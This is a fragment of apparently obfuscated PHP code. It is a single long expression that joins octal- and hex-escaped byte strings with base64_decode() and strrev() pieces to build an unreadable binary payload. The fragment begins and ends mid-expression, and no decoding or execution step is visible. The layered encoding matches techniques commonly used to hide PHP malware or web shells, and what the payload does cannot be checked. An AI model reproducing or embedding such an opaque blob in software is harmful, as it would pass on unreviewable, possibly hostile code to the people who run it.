133\374\302\45"."\343\316\372\374\340\375\152\176\357\130\364\352\276\17\333\136\156\275\324\377\302\141\147\155\273\341\340\11\17\346\157\237\163\252\373\313\135\217\354\332\360\364\254\314\100\373"."\360\215\127\354\134\260\347\271\107\166\175\264\362\257\367\17\336\244\356\270\370\205\334\362\353\216\353\377\325\202\277\256\75\354\244\7\326\334\75\161\343\327\267\50\333\156"."\276\347\214\205\27\135\136\262\341\365\65\267\166\134\370\313\307\337\335\321\27\372\317\15\257\235\273\150\357\131\37\75\234\171\367\230\206\175\115\373\137\272\344\365\232\364"."\x92\x7\x4b\xfe\xd8\xba\x74\x7a\x6a\xc7\xf8\xf6\x35\xc6\x9c\x57\x2f\x7f\xf2\xf4\x25\x83\xff\xbc\xfa\x95\xad\xbb\x4b\xfe\xf1\xe8\x17\xa9\x99\x89\xb2\xfd\xb6\x3e\x34\xef\xb0\x71\x4b\x3f"."\175\260\155\132\366\344\373\17\272\370\372\257\237\371\254\361\373\217\244\33\172\52\336\271\351\242\333\146\70\36\277\166\246\374\376\221\335\273\37\137\374\211\57\350\236\70"."\347\333\263\157\277\77\225\174\135\176\247\375\312\67\116\170\177\346\117\133\47\174\265\355\207\111\317\237\62\341\235\53\267\272\277\375\355\204\370\370\45\335\173\177\22\173"."\x69\x70\xf7\xa3\xa5\xf\xdd\xb9\x64\xe2\xe1\x25\xab\xe5\x83\xe\x3f\xf9\xad\x73\xea\x57\xff\xe5\xca\x49\x4f\xde\xf5\xed\xfb\x1f\xde\xbe\x7a\x8b\x43\x1b\x9f\x7f\x76\xef\x51\xdd\xd7\xcc"."\232\172\246\374\355\355\335\7\217\76\263\350\364\267\116\355\174\152\353\147\333\365\171\257\357\353\230\261\355\215\177\316\236\74\353\266\243\356\173\353\352\275\137\74\26\337".base64_decode('0DT47N6HJ599XfchFevPeH7L1pGVG17bU972yw/6Bz+ZsvDGY1ZNfU+u+ukDHw==').base64_decode('bH/uoo9Kt7k+P27t/F9f3HDYjre7Knc8G1rhWTd6wubtC1z7fnZq9sybjMNOmg==')."\260\154\327\63\207\324\172\257\73\342\325\7\342\277\32\361\55\134\371\355\323\327\34\174\300\233\23\33\156\336\161\371\373\125\177\371\323\7\343\372\73\232\16\333\74\364"."\363\222\313\107\237\71\167\375\215\375\371\137\365\334\264\342\360\237\254\273\343\315\354\275\117\227\377\174\217\171\302\45\377\374\354\253\256\73\237\175\243\142\144\371\5\53"."\246\74\336\376\345\13\63\377\366\320\143\232\22\215\173\376\165\303\107\233\113\256\374\131\325\277\227\117\237\336\277\346\353\111\117\236\266\361\302\373\276\331\261\373\330\343"."\xbf\xf8\xbb\xdc\x92\xbc\xee\xc1\x7f\x18\x2f\x6a\xd3\xb4\xd3\x8f\xd9\x31\xa1\x6a\x5f\xa3\x7b\x7d\xdd\x9c\x6f\x4e\x39\x32\xfc\xdd\xc6\x9b\x4e\xb9\x71\xcb\xf7\xd3\xf6\x5b\xfa\xc4\xd0\x25".base64_decode('D2/b+5NPb1h3wWczpx4mDwz+tu6DWxvnPmWcNfyatGB++uahuj01D9Vdec2y5w==')."\367\323\46\375\241\366\301\366\352\265\227\306\35\217\37\260\256\274\354\236\121\317\273\367\56\377\150\142\315\5\357\375\55\163\352\47\373\206\336\373\327\272\232\23\133\236"."\333\277\176\336\333\353\37\130\366\361\55\67\247\136\271\40\237\137\366\63\243\357\271\353\117\316\277\172\325\267\353\67\127\217\334\125\331\160\353\373\77\173\373\236\255\165".strrev('qšoOÏ#†İsŸwQÒñŸ473õ±½¼“#AÁzİ=#ôú7/´=İÅº\\Ş').base64_decode('TXzveZPjr39+2VPH7vj5MxV//5/5q/70m5pfHL1z1eTL5XnLf35m08ifDo4kdw==')."\x1d\xf6\xe4\xa7\x1d\x5b\xf7\x3f\xe5\xb8\xda\xb3\x76\xf4\x6\xbf\x7c\xe9\xdd\x65\xdd\xa5\x93\x6f\x3b\xfb\x48\xef\xbe\x74\xc5\x5\x47\x5d\xf2\x37\xdf\x13\xed\x27\x94\xd\x7c\xdd\xb5\xb8"."\343\205\251\347\127\174\274\347\266\137\34\37\275\163\333\266\341\157\376\162\171\340\201\125\137\137\365\254\173\333\127\333\277\76\47\162\365\17\273\137\331\175\342\352\125\237"."\74\167\361\345\333\176\170\164\326\263\363\346\234\372\251\367\315\203\172\347\235\62\372\311\263\267\275\377\103\344\207\117\166\334\265\373\350\153\126\145\277\277\345\235\77\234"."\372\237\367\266\167\237\172\377\177\136\271\351\207\357\276\334\375\107\347\150\373\355\346\225\277\332\166\314\366\17\322\157\57\77\177\370\323\245\73\25\345\276\301\57\37\371"."\347\273\352\367\247\364\254\334\173\337\367\367\204\37\132\264\163\313\346\227\366\231\53\337\230\373\335\133\53\317\274\377\273\367\36\172\57\131\67\247\366\201\37\336\175\353"."\234\266\131\225\125\67\135\266\272\332\350\271\340\233\317\244\370\163\173\242\133\153\247\115\130\270\163\301\346\305\332\14\43\277\355\360\305\7\156\73\357\360\257\46\35\165".base64_decode('cV/k8zduHe3/7Pzyb/e1P/z0zIs//p9nLross6KrctNLP586W3+k5vSbLznxnA==')."\347\257\114\174\272\356\225\236\113\247\314\67\42\337\235\75\375\362\315\201\277\334\260\156\145\313\355\27\155\234\63\60\363\244\7\177\330\157\153\113\360\363\222\211\324\114".strrev('ıá4ÑŒÓ6úrtßyÈ%ŒïX¬ÔY¬ìü!±%NbäÄJf$Äzz¨J"LÆz¾')."\153\250\32\152\270\57\35\37\45\165\341\237\314\120\164\64\237\42\107\122\323\247\117\247\165\21\171\42\227\210\146\107\11\57\76\147\6\51\47\252\15\253\43\161\42\374"."\246\206\222\203\361\74\221\357\146\126\323\142\323\175\321\34\225\142\147\314\41\335\252\231\136\115\133\111\52\30\312\245\15\75\105\232\24\33\34\111\344\65\322\226\301\254".strrev(' Ôh|hç»RMš6-´Ÿ¸cÑ¡úDNÛL7Ö”‘¡­ÒA¡Ñ•Wë'."\r".'"¬4µ©').base64_decode('WXVDyY+QQHU1HTQtljUGo6QqY2BYp3q62VWk5VWVs/DHcD42ks4SbU7WzEUH0w==')."\44\155\324\120\143\11\72\314\63\347\314\242\162\10\371\230\76\207\214\112\65\35\316\41\71\235\315\220\156\150\271\174\142\210\32\201\244\162\3\175\31\235\24\73\143\66"."\31\305\244\236\215\231\3\344\364\166\66\305\212\324\160\72\237\34\42\43\236\34\215\32\3\131\242\352\314\365\367\31\43\264\43\132\377\110\332\210\222\314\211\234\21\313"."\153\244\277\63\51\352\50\251\201\276\176\225\264\177\366\254\331\24\121\314\124\162\224\224\62\324\27\223\223\124\327\155\346\24\55\21\33\245\130\111\132\251\144\6\206\362".base64_decode('MSqZKwOZfIKKxfHBfJIeNyrqQGY4STB95gwyygNJM5Gn5ipaKtefGCGzOIMgzg==')."\340\250\152\44\206\311\360\353\375\231\164\252\217\244\250\236\111\106\144\164\320\4\313\210\236\171\344\365\141\115\45\201\331\65\244\123\125\125\244\265\252\71\234\316\45\211"."\312\136\321\323\243\303\161\322\246\331\63\253\350\7\111\73\213\316\144\172\110\313\44\150\246\104\72\76\150\60\155\331\120\146\120\215\122\45\10\350\273\226\43\62\377\254".base64_decode('6aQDSVUejWXJ2A/LZio6QnpTU0lWeA2d8dSw2a8NUoyaTqKnV5KWjZqGMjJAKg==')."\110\105\143\252\76\114\20\50\243\231\175\261\1\322\216\232\52\322\153\135\216\16\347\206\110\22\145\140\330\210\215\222\261\233\65\233\256\137\163\70\256\322\165\66\143\46"."\xa9\x71\x6\x5d\xbf\x66\x34\x67\x64\x12\x3a\x6d\xe6\x6c\x4a\x20\xe8\xec\x45\x13\xe9\x1c\x59\x83\x43\x9\x43\x4b\x51\x3c\x88\xc9\x7a\xba\x2f\x4b\x46\x56\xee\x1b\x34\x47\xe8\x94\xe4\x95".base64_decode('hD4Yp4M0m0xh1ewZlLCQuigNyuT7+1RKmaqqaijVS4/KCTKo2VhOyfSTyvLpWA==').base64_decode('LjPQT1fESDZJV1DVdFpZ9RyK87NoR4bAwJNupvXh+CjVDCXl0cHhfmLPkBzMZQ==')."\264\74\265\276\33\112\346\372\22\124\261\235\214\202\36\223\144\203\3\112\56\37\45\61\113\323\44\175\243\34\33\240\52\156\303\224\315\234\141\113\100\257\160\304\104\43".base64_decode('3gFFocakpLcmP7M3csjsncDVtAJ1MDQ1V5pAvZdw0g+DITFnLGMK0SBkiQ2Zmg==')."\316\154\13\260\325\222\13\266\312\145\355\4\305\121\174\140\57\236\261\121\245\264\141\344\65\235\364\165\100\213\307\122\132\56\156\51\65\36\265\224\311\240\124\127\144\217"."\x49\x8c\x1\x7\xe5\xf0\x33\x50\x1\x66\x19\xa0\x28\x9a\xe\x66\x73\x2\xff\x23\xcd\xc5\x37\x8c\xc\x65\x10\x60\x15\xd5\xae\xe1\xd4\x2e\x3a\x7\x51\x61\x2e\xb1\xe2\xdf\x94\x8d\x1\x97"."\x8\x76\x8a\xb1\x6a\x6\x34\x33\x95\x72\x59\x6f\x9e\xc1\x6b\x48\x74\xea\x23\xdc\x20\x17\xb6\xb3\x4b\xb0\x13\x81\x61\x41\x1b\x2b\x74\x88\x4f\x9a\x30\x82\xe2\xdc\x59\x3b\x4f\xf\x80\xfa"."\x14\x13\xde\xa3\xa2\x46\x31\x14\x61\x4\x4b\xc4\x6c\x5c\x63\xd0\xb8\x61\xb9\x47\x47\xb6\xdf\xf4\x8\xc\xa\xdf\x6c\xae\xc3\x4a\x3a\xb\x67\x8c\x34\xc1\x8d\xaf\xa6\x70\xb3\x5a\xeb\xb4"."\x16\xeb\x3\x8e\x28\x32\x5b\xb0\x23\x7c\x9c\xca\xe0\x27\x39\xa3\x82\x9a\x4c\x29\x21\x3\x40\xbc\x56\x4a\x80\x6c\x12\xb5\x40\x97\x4c\x8d\x7e\x93\x59\x70\xc3\x59\x70\xa3\x46\xb\x33\x20".base64_decode('xuGe8kgbJhYdYdZoNspMtc/1zKQbgvE1PsjhABG1revSgvTWFS1GWceNHJ6iGw==').base64_decode('cA4JN8UhoVNZyXopy9csseNtEY/F5utKNiXHWNOzI0WHXGyNeCRs61qoyDCyzg==')."\x59\x22\xc1\xcc\xe4\xcc\x22\x9\xc5\xd1\xb6\x1c\x91\x6a\x4d\x29\x40\x6d\xb8\x29\x32\x3a\x38\xe7\xdd\xc0\x41\x76\xba\x15\x2\x15\x31\x62\xa5\x2b\x71\x95\x5a\x86\x2a\x69\x94\x92\xd2\x7b".base64_decode('dHrFTFJjKUXWLSdndQ3ZZBbeejXnNpCrd+SIMCLUS775JQERmrKfxlGC4WpuFA==')."\256\247\302\144\44\7\77\151\5\60\57\134\320\143\301\233\231\245\202\24\312\365\365\51\206\131\213\56\276\110\323\44\320\226\131\256\31\340\3\55\212\32\327\54\360\211"."\x6\x82\x1c\x6a\xf5\x64\x78\xbd\x64\x63\xcd\xc0\xef\x60\x2e\x3\xe7\xa0\x56\x68\x15\xdd\x10\x5d\x3c\xad\x3c\x8d\xc7\x2b\xf1\x93\xc8\xc8\x8\x7d\xc8\x93\x4\x34\x6f\x44\x4e\x90\xfb\x3e".base64_decode('vowdwhE2AshYhOyVZMYaPSFfU6TTQ23E5WzWbcQHDDe07VKHFL8adcPLdHBUXQ==').strrev('N¸CYÒÈÈ‰M™€–9¸À%»wñºÄıM:çIºjE4†'."\0".'ŞjQ')."\30\344\10\6\263\243\141\376\221\254\246\210\15\131\320\335\14\263\31\64\122\62\75\376\64\300\30\250\31\205\241\146\316\20\315\255\25\276\322\241\135\156\4\354\274\164"."\xb\x2\x48\x1d\x89\xab\x24\xa9\xdf\xd7\x18\x69\xf6\x5\x85\x21\xce\xe6\xec\x43\x2c\x5e\xe4\xf6\x74\xfa\x22\xa1\x50\x40\x18\xf0\x5a\x61\x2b\x80\x97\x66\xf8\x79\x3a\xc\xf1\xcb\x33\xf0"."\x8c\x4a\x34\x5d\x12\x59\x3\x78\xd1\x16\x5a\x36\x87\x24\x62\x61\x7\x50\xbf\xa9\xcd\x13\x64\xd6\xcb\x35\xae\x4a\x57\x15\x4f\xb\x2a\x8c\x40\x23\xee\x7a\x7a\x73\x2f\x14\xf6\x4\x8b\x5c"."\272\306\227\261\311\44\220\13\330\44\103\133\240\133\152\12\370\273\332\73\102\370\226\61\206\167\4\204\170\144\243\112\242\351\225\354\302\150\122\274\267\323\357\151\362\112"."\xbe\x8e\x70\x80\x1a\xa1\x33\x3\x42\x74\xfd\x20\xc4\xc2\x74\x8\x80\x9c\xca\x2e\x5b\x93\xfc\x38\x20\x5e\x91\x10\x4b\x64\x25\x91\x5\xb5\xcc\x51\xda\x53\xd2\x53\xd1\x53\xd6\x53\xbe\xc2".strrev('Ï{ƒã¹/»ÃäĞ3äTX=Z~M=	¬Üˆ´({{Ûbû-Ré3gu;!)ÅºôcÕ')."\337\175\325\246\235\277\133\13\12\332\265\376\214\135\227\337\363\301\226\265\37\236\171\377\316\115\153\166\77\160\376\256\113\156\333\265\346\164\322\346\17\157\373\313\7\367"."\157\333\175\311\315\73\67\135\261\353\262\255\273\327\237\205\43\366\154\274\143\347\271\67\263\206\111\173\56\176\140\327\371\67\354\272\364\366\135\153\67\355\274\367\342\235"."\367\235\261\163\313\26\7\310\275\347\67\153\167\337\277\151\327\157\57\333\265\341\264\135\233\317\333\365\373\265\73\317\275\156\347\225\67\357\76\377\266\235\177\74\163\347"."\331\153\77\274\355\322\223\354\310\203\303\313\350\360\23\3\11\367\362\36\243\242\14\17\151\217\61\15\16\147\71\370\55\203\166\354\340\227\232\354\2\224\13\301\373\156"."\35\115\136\373\275\20\61\110\156\247\127\140\254\200\110\315\330\106\203\334\156\247\341\10\272\12\124\72\146\53\126\221\71\27\32\45\64\246\331\33\152\12\372\32\275\304"."\122\232\115\324\24\144\204\113\354\54\0\64\24\134\314\276\331\345\250\2\237\2\122\31\105\340\162\311\322\21\331\25\3\62\170\72\203\32\53\225\100\323\247\22\7\44".base64_decode('log1lErgFgoASgwstzJ4xxhZbZYuLXVUOqrKJeJwAOcgDgakEmK7y/JZKnFELQ==')."\xa1\x2a\x47\x65\xb9\x54\x92\x1d\x28\x21\xed\xe2\xe3\xa\x5a\x1f\xc1\x29\xd\x49\x76\x94\x91\x6\x8b\xcd\xe5\x69\x1\x8d\x32\x4c\x5d\x56\x1\xd1\x92\x62\xe\x6\x62\xf9\xc1\xaf\xc5\x69".base64_decode('QMzFc+B5AinsMMnT0WxNiX0NdJZKciYOYvD4itNcWi5Fif15kUiUzTIY9ZbBKA==').base64_decode('m0ZoQ2crm29sMi7hu0e4WbJBJ4pA0VRBKJ4tmlYD3QCTg9ODDxYzoIzwkgAJYg==')."\x11\x74\x6\x21\x9c\x4d\x62\x91\x38\xe4\x4\xa2\x4\xb3\x80\xb8\x9f\x69\xa3\x8f\x92\x37\xe2\x7c\xa0\x7d\x29\xeb\x3\xc5\x65\x89\x32\x2a\xcc\x85\x4\xbc\x45\xe5\xd\x37\xb5\x61\x2c\xf".base64_decode('CWgej06xICofTsmCIkzqIOnwcoEE4RCUztfREgi249tDoaY2b7vHRQg3xgScHg==')."\62\132\122\275\124\12\51\37\6\225\132\206\37\125\104\207\54\214\152\5\353\52\142\2\226\12\217\102\266\217\64\206\314\276\204\56\223\312\50\113\175\51\276\233\115\212".base64_decode('ZB5PAsFwBAwAIc8C1S0VdgjBYBheghmiAkBCjgEpnboeiFLHKKBwWGZToKPFRw==')."\x2f\x4a\x35\x47\x2d\x71\xcd\x41\x1f\xbc\xf\x4c\xaa\xe5\xb2\x20\xb7\x22\x1\x81\x2c\xd3\x79\x44\x23\xfc\x2e\x2c\x8c\x60\x3b\x3a\x8\xf0\xd\x1d\xc6\x8\xfe\x59\x60\x35\xa1\xe\xf6\xcd".base64_decode('+VgQgIabnLZ2N7PvNnaHEUYEgkLAE/S0h1gw2A1oNYQJd/naPaEw6FVHVzun5w==')."\176\317\142\200\12\1\316\162\120\132\134\346\252\150\50\357\301\67\225\360\47\376\231\117\103\360\206\107\357\312\52\207\64\163\165\71\111\103\357\366\104\314\44\140\24\43".base64_decode('vJZF/og/0IrDyG+MNxPnooa0TAI8c5jzzAbdmBiuSwBDJXz9UeoIdHu4ExIhAg==')."\103\310\255\113\211\273\46\161\57\137\326\223\357\161\1\56\300\130\301\57\40\65\67\112\224\277\150\202\274\56\21\374\111\156\17\335\53\127\70\310\266\20\111\151\175\324"."\171\0\240\172\224\47\300\277\113\350\7\42\210\44\3\20\143\263\51\172\23\11\137\201\212\364\254\352\231\332\343\164\341\133\137\220\53\351\161\360\46\105\274\113\300\106"."\32\12\131\256\254\105\220\133\15\122\72\350\54\371\302\113\23\7\352\310\17\221\257\352\310\20\220\340\274\172\66\247\336\105\253\72\300\337\326\360\52\57\370\353\7\77"."\xfe\x30\x98\x35\x95\x25\x0\xeb\xce\xef\x5b\xe8\x5d\x5\xff\xe1\x11\xe5\x6c\x20\xf1\xb5\xf\x6b\x6\x5f\xc7\x2a\xf0\x2f\xa0\x22\xab\x7c\x1d\xf6\xc2\x1a\xbd\xe1\x6e\xaf\x17\x27\xa0\xdf"."\344\227\47\5\124\205\164\125\160\57\264\40\100\157\54\112\176\157\113\130\202\141\332\214\110\244\14\15\246\263\167\132\171\44\342\66\272\10\332\260\373\341\145\245\223\253"."\112\311\106\341\11\65\161\22\153\101\210\102\134\100\326\355\126\104\140\356\162\110\270\65\30\350\352\24\302\155\236\305\276\216\126\32\162\127\320\257\12\352\266\243\331\27"."\2\103\324\104\221\221\173\361\21\303\204\253\104\274\217\310\316\132\60\273\31\220\157\20\20\170\161\310\345\143\362\153\135\154\215\135\76\177\263\170\113\27\46\44\273\6".base64_decode('It1k45hCG0fD6L4uDcAhp98I3WgAjQEN4AGgITRcNIC8BdEA6igNQLHD20HjgA==')."\xb0\x7\x4\x35\x2a\xc1\xf5\x71\xa3\xe7\xa4\x3c\xc4\x6e\x9c\xcd\x8d\x47\x85\x8b\xe3\x90\x12\xbb\xb0\x12\xd\x7a\x13\x0\xb2\x98\xcc\xd4\x92\x36\xed\x22\x52\x42\x9\x4a\x0\x6c\xc8\x28"."\11\27\137\241\232\122\120\34\271\161\12\300\154\242\64\340\267\147\105\3\142\206\127\120\224\305\227\55\315\260\152\246\54\225\222\373\131\240\122\37\272\337\46\124\113\266"."\163\256\117\302\32\340\210\46\50\205\261\232\230\150\114\271\246\306\52\25\61\212\264\202\11\73\344\202\272\203\374\222\32\351\255\1\253\254\12\73\153\65\22\205\20\202"."\x1d\xe3\xf1\x4f\xf\x29\x81\xaa\x38\x4a\xc8\xa6\xeb\x20\xdb\xae\x2f\x10\xf1\x83\xcd\x24\x22\x4a\x92\xbe\x0\xd1\x8b\xb8\xa2\xe2\xbd\xe7\x8\xbf\x3e\xed\x92\xb9\xa9\xa6\xa9\xe7\x4\x5f"."\104\310\154\23\114\256\207\337\222\144\252\32\24\227\213\302\304\302\150\252\132\55\124\265\101\50\136\257\204\245\202\100\172\133\32\373\150\262\333\124\212\140\156\226\311\164"."\203\324\32\124\5\23\141\311\40\52\237\345\270\140\203\51\321\232\221\322\62\143\165\44\4\20\45\25\201\67\213\1\33\24\121\170\373\323\212\141\260\363\3\304\26\320".strrev('Ö>IIl¬®ÆñòÒ+¡‚ÀØWåh2(æ“‘IHf2åXéš’şŠu¯É3O').base64_decode('cSEVB/q5ZySoguNl9lLWlXdyVM3aFXIZrVPR0yrSLXZzm3UWL+RGVwO0HxvcXA==')."\x6\xd4\xd0\xc9\x66\xd6\x59\x45\x13\x53\x7f\x78\x8\x61\x24\xc6\xc0\x31\x43\x6c\x30\xa5\x28\xaf\x60\x3b\x8c\x68\x9\x29\x56\x27\xa7\x0\x27\xd9\x1a\x67\x6a\x5a\xbb\x9c\x19\x9\x6b\x8b"."\125\205\240\151\163\240\273\303\37\240\16\137\250\67\50\102\310\310\221\45\20\202\164\27\15\230\364\103\227\111\315\335\164\243\203\213\125\360\21\170\222\210\3\150\62\71"."\116\172\202\115\155\200\105\215\264\370\0\147\356\135\22\346\5\264\201\254\200\351\25\246\111\200\266\123\147\10\200\342\102\322\346\327\372\330\342\5\244\213\70\1\261\54".base64_decode('YF+A5HUp0OYeW2LDOxIsI3Z38d8zdQmOtMZYm0XzNZGErEIdiRn/vcKgwplvkA==')."\15\135\161\370\257\231\270\113\67\124\23\312\44\320\55\133\36\204\100\330\144\234\314\165\222\104\163\357\5\200\130\2\251\242\15\354\264\201\340\122\322\175\43\154\241\177".base64_decode('8LhOjbnRRSnCN8xFClgnGhzCi6wERI990YM54k2D6/E9+GdpOu4ETSUHbnHFZA==')."\136\14\340\272\362\10\76\26\204\153\146\151\106\222\362\202\207\41\171\110\201\167\30\50\163\136\160\224\111\272\314\273\103\7\201\171\21\260\236\165\55\14\64\107\102\201"."\256\40\325\345\301\60\272\252\26\364\66\55\145\52\66\6\155\361\54\266\103\40\326\207\75\255\105\301\114\216\202\160\304\251\104\202\1\50\116\172\375\55\266\14\241\66"."\xe6\xec\xc9\xa\x8b\xf8\x7d\x1d\xb\x8b\x46\x84\x3\x91\x76\x21\xb\x6\xfa\xc2\xde\x76\x3b\xcc\x5a\x42\xc8\xb\x57\x2c\xf\x37\xfa\x3\x4d\x42\xb4\x2f\x50\x38\x12\x80\x3d\xb2\x1\xb1"."\124\212\201\200\275\356\131\211\170\222\132\300\232\304\127\101\206\326\31\1\374\160\103\317\352\362\262\36\167\203\253\202\211\143\230\202\10\267\254\306\0\33\224\322\327\332"."\1\160\223\240\100\234\215\204\334\56\27\251\204\175\0\201\221\271\316\240\204\223\170\330\13\141\47\3\226\126\330\256\15\323\33\214\56\273\103\52\37\326\250\107\102\113"."\103\154\264\61\52\26\213\267\340\27\116\46\236\205\331\22\203\277\235\142\122\170\130\133\64\241\5\101\55\167\325\104\220\113\325\370\132\340\213\66\256\305\162\320\217\1"."\37\161\276\261\0\220\213\157\252\164\335\61\315\1\331\126\234\242\57\102\70\246\42\177\20\217\332\366\10\2\340\147\66\302\116\302\201\325\324\104\141\251\63\355\214\367"."\204\133\241\147\245\236\223\131\3\125\135\160\155\4\70\311\270\52\334\223\224\143\224\25\310\305\6\250\275\33\42\131\206\63\257\322\41\230\314\274\40\220\103\342\210\214".strrev('<=INœ8„*‚t;z•)jÊÙ»%€ò¡M2AlOªrœeö¡§A…+DD~')."\341\141\276\311\140\300\140\41\21\57\20\151\144\147\231\220\0\267\331\320\220\1\231\347\264\20\352\104\255\64\203\270\3\154\1\374\231\160\331\207\72\170\343\67\146\341".base64_decode('Do884OGgQ+LORakcWpz9gDKPcHuJEo30AD+KSw+wc6uYZduEOxQP6cLOSDx5gg==').base64_decode('uMYReihN7ho1jsCtrYBHg9dXRWeonu7QDGdbu6fJCUhfdc1MtgH1hMEORHFJzg==')."\x1b\x33\x28\x27\x8c\x21\xd3\x66\x4a\x49\x30\xf8\x4\x49\xa\x3d\x90\x4d\xb6\xba\xdc\xc3\x40\xec\x40\xb\x48\x68\x71\x78\xba\x47\x79\x1c\xc\xb5\x21\xf\x6\x72\xae\x1d\x87\xb1\x63\x16"."\172\210\236\224\131\203\141\67\360\127\261\172\227\24\255\167\111\261\172\227\330\352\135\122\130\57\6\331\220\124\316\146\233\260\213\117\221\232\130\100\61\61\100\51\156\2".base64_decode('nl6KZ6BEFsUmSi4Q3YzZvThLb/AvthASwhKxFOcipClOCbxBCXxKNkzIC/9f+A==')."\311\203\27\345\333\31\203\256\123\124\166\153\206\341\206\76\201\20\57\311\314\0\2\41\252\207\263\366\11\37\270\12\362\40\161\130\302\134\266\61\207\156\334\353\33\126"."\x9f\xe0\x6f\x2f\xbb\x9\xf\x58\x62\x4f\x9f\x12\x52\x20\x69\x23\xa3\xe2\x1d\xce\x6a\x86\x22\x7a\x1e\x8c\x2b\xc8\x47\x15\xbb\xea\x28\x78\xeb\x4b\xcb\xc3\x90\xf8\x50\xeb\x8\xc1\x6f\x1f"."\x75\x69\x27\x3a\x8\x82\x3\xe6\x4c\x5b\x1c\x86\xe\x3b\x41\xd7\x6d\x7e\xee\xc\x45\x19\xa0\xa2\x8f\xc0\x1e\x33\x71\xb5\x93\xf9\xaf\xb3\x77\x47\xb5\xf8\x20\xe0\x14\x51\xe7\xe\xf\x91".base64_decode('ot1ZFOAUrhFjuiA4wAQtpCapoMFkJSfRKFFhF/+cXKz/Tp07GwSzil3TLlRGqA==').strrev('p²:İ…â$IŞ¢ÔÒ|Çå´³8-š"rêf‹	ïiíiëúy°ZÛ>Û').base64_decode('5CMMT5FX6iKYugjCCa4muGlBNie4RxexA+7TzHoACrfYBSQlEMg1I/Hhynwlgg==').base64_decode('4ck0anGy6a0sAXhXUlsyuQz8lpc4SiDLhMJwpiAAtaOkdnIZ+ign9+lHiQmu4A==')."\xb\x8d\x1f\x5f\x10\xb1\xb6\x41\x36\x4d\x41\xdb\xd6\x80\x46\x3\xae\xf4\x6a\x77\xb5\x3b\x4f\x56\x7f\xc3\x20\xac\x91\x3b\x61\xb6\x53\xfc\xe1\x8\x20\x72\x54\xfb\x14\x11\x49\x2d\x21\xe2".base64_decode('ZNTFmDbWEkqE25trKM30tJ/s5N4J6xqG0ymJyD/1pVWuylKJ+vCuL+0Ktzhnlw==')."\x36\xcc\x1b\x57\xd7\x84\xd4\xf0\xa6\xd2\xe\xf5\xe8\xd0\xf3\x23\x16\x44\xe7\x11\x65\x59\x1d\x5c\x4c\x2c\xe0\xb6\x86\xc6\xca\x4b\x68\x52\x5a\x1e\xd5\x32\x60\x63\x3\xf4\x28\xed\x8a\x91"."\301\354\142\64\213\73\214\314\50\146\136\323\311\31\3\41\247\325\324\320\71\51\120\232\264\101\326\30\276\346\137\13\365\144\264\373\135\331\221\134\306\11\305\141\147\110"."\164\271\143\363\114\133\151\115\17\5\132\153\172\221\20\306\70\211\110\363\117\354\111\270\126\22\335\113\13\356\370\234\220\3\300\53\217\352\126\10\14\322\110\12\122\255".strrev('RÀaäË¢rp, (ûcg»c«X¥MlØø‚«€¨p½­¾p¬F'."\0".'œ6Ö')."\303\150\350\163\325\11\347\327\251\306\307\212\341\213\272\150\123\143\4\125\212\45\351\312\251\161\173\225\350\130\307\231\313\321\12\213\26\52\62\374\64\1\352\204\217\225"."\x67\x61\xbd\x81\xa8\xee\x64\xdc\xb6\x9d\x7b\x17\xf4\x97\x85\x5e\x4b\xc1\xe2\x95\xaa\xa7\xd7\xd6\xcc\x1\x7f\x8\x79\xa4\xa7\x52\xb9\xac\x59\xcf\x3e\xa9\x57\xd3\x93\xdc\x9\x4a\x7\xb8".base64_decode('w2PaNzjhFleuApgPI1vhlIBY0vHWWtxlk45iSVJwYIsUrXglwWPaCPMEXISSxg==')."\225\41\272\133\222\315\122\260\154\143\23\322\107\77\164\226\136\346\113\44\232\32\340\75\211\102\273\75\202\341\3\240\241\32\147\252\320\266\52\150\65\143\311\134\146\240"."\x5e\x88\x94\x4c\x4d\x93\xd2\x72\x66\x84\xb0\xfb\x53\x8c\xda\x29\xc6\x5c\x58\x51\xfd\x14\xd7\x8c\x84\x1\x2\x84\x5e\x33\xbf\x6e\x70\x1f\xe1\xce\x96\xb0\x9b\x6\x12\x83\xd5\xca\x2e\xe8"."\146\333\5\67\251\140\216\332\51\43\25\23\141\37\122\71\346\156\71\213\276\111\153\73\375\135\255\276\16\341\224\131\0\104\232\232\73\42\236\316\316\242\21\142\35\156".base64_decode('eCDj6qcvCsQohtWp6T4pBm1Q60sgtEQy9Bj1dFfiJjQVJeDCUp1KspTCLFICoA==').strrev('	dê’B{îĞBD<Zg'."\n".'™›€xnNŠ	=Ë­‰¸×BîxunuyÒèá}Œ')."\x69\x7d\x29\x3c\x5d\x4b\x94\x4a\x49\xb0\x37\x33\x13\x95\x79\xf6\xcc\x1d\xf4\xcc\xa2\xce\x2d\x8b\x91\x70\x95\x5\x35\xca\xf8\x32\xf1\x69\x88\x29\x8f\x8b\x6a\xc5\x3d\x31\x9b\xbb\xe4\x26"."\71\263\270\60\13\54\334\25\53\26\345\106\22\276\233\13\205\26\67\120\326\343\1\246\121\57\202\14\56\366\30\101\126\216\15\100\254\342\133\0\116\350\42\21\235\120"."\x28\xc1\x11\x16\xe7\xbe\xa6\x70\x3c\x6\x9a\xb\x2a\x85\x42\xa9\xce\x9d\x95\xaf\x5c\x89\xb\x82\xbb\xfe\xea\xd5\x85\x30\x62\x60\x63\x8f\xf2\x64\x55\x3b\x8\x62\x8c\x1d\x6\xe5\x6a\xe".base64_decode('A3uZtRqMrWIiDqFp/B2tPAMWOngYRC6jtmso1LOs1FWxerVbpSfSPSXWvC6WGg==')."\207\173\134\326\364\240\345\144\250\131\102\2\260\247\304\74\343\2\262\310\306\271\53\270\151\77\73\171\226\340\161\164\175\375\274\145\354\114\241\227\306\121\306\117\255\232"."\115\247\173\64\351\14\167\263\317\246\16\316\332\62\144\306\164\303\205\164\40\36\253\247\276\206\41\346\113\133\244\64\370\333\223\315\212\101\352\113\36\151\273\123\152\324"."\315\126\65\326\200\273\142\334\306\235\46\101\64\305\6\207\307\306\266\10\150\333\214\300\103\200\0\2\116\253\337\16\7\145\61\40\373\250\63\142\272\232\65\55\364\10"."\x3f\x9a\x53\x82\xbc\x9f\xf7\xcb\x43\x32\x4e\x52\x22\xd1\x47\x38\x4a\x90\xaf\xd7\x12\x40\x7f\x70\xc\x59\xf8\xbc\x29\x75\x90\xd0\x48\xba\x92\xaa\x2f\x41\xcd\x35\x92\x8a\x2\xf2\x23\x52"."\122\254\22\220\261\104\242\124\60\55\263\21\323\115\15\154\166\314\120\232\74\70\320\25\44\126\247\236\16\162\246\100\330\250\111\313\361\357\344\111\24\121\320\13\27\51"."\x45\xc7\xa6\x75\x88\xba\xa0\x53\xa6\x4\x57\x54\x91\xf7\xf\x3a\x83\x81\x70\xa0\x89\